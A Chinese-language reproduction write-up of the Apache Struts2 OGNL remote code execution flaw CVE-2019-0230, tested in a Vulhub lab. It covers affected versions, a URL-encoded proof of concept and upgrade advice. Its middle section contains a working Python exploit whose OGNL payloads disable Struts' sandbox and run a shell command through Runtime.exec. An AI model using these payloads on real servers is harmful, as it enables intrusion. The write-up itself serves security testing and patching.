# 0x00漏洞简述

2020年08月13日，Apache官方发布了Struts2远程代码执行漏洞的风险通告，该漏洞编号为CVE-2019-0230，漏洞等级：高危，漏洞评分：8.5

漏洞产生的主要原因是因为Apache
Struts框架在强制执行时，会对分配给某些标签属性(如id)的属性值执行二次ognl解析。攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。

# 0x01影响版本

Apache Struts2：2.0.0-2.5.20

# 0x02漏洞复现

虚拟机部署docker安装Vulhub一键搭建漏洞测试靶场环境。

docker-compose up -d

1、访问漏洞环境

![1602335680_5f81b3c0431c8f9064b37.png!small](https://image.3001.net/images/20201010/1602335680_5f81b3c0431c8f9064b37.png!small)

2、POC验证，传入ognl表达式的poc： **%{yun*zui}** 这里需要URL编码

![1602335436_5f81b2ccc4564cd314c86.png!small](https://image.3001.net/images/20201010/1602335436_5f81b2ccc4564cd314c86.png!small)

http://192.168.60.131:8080/?id=%25%7Byun*zui%7D

从测试结果可以看到 **id属性返回了yun*zui的结果**

![1602335449_5f81b2d9cad3d320c7873.png!small](https://image.3001.net/images/20201010/1602335449_5f81b2d9cad3d320c7873.png!small)

![1602335469_5f81b2ed9b922065b1d04.png!small](https://image.3001.net/images/20201010/1602335469_5f81b2ed9b922065b1d04.png!small)

3、简单python脚本进行漏洞利用

    
    
    import requests
    
    url = "http://192.168.60.131:8080"
    
    data1 = {
    
    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
    
    }
    
    data2 = {
    
    "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/yunzui'))}"
    
    }
    
    res1 = requests.post(url, data=data1)
    
    # print(res1.text)
    
    res2 = requests.post(url, data=data2)
    
    # print(res2.text)

运行完脚本之后，将远程执行touch /tmp/yunzui命令

![1602335482_5f81b2fa3ce5908a26ab6.png!small](https://image.3001.net/images/20201010/1602335482_5f81b2fa3ce5908a26ab6.png!small)

4、命令执行结果进入docker查看，成功执行。

docker-compose exec struts2 bash

ls -al /tmp

![1602335501_5f81b30d63ad01a07afe5.png!small](https://image.3001.net/images/20201010/1602335501_5f81b30d63ad01a07afe5.png!small)

# 0x03修复建议

升级到Struts 2.5.22或更高版本

或者开启ONGL表达式注入保护措施

# 0x04参考链接

> <https://cert.360.cn/warning/detail?id=d2b39f48fd31f3b36cc957f23d4777af>
>
> <https://cwiki.apache.org/confluence/display/WW/S2-059>
>
> <https://codeload.github.com/vulhub/vulhub/zip/master>

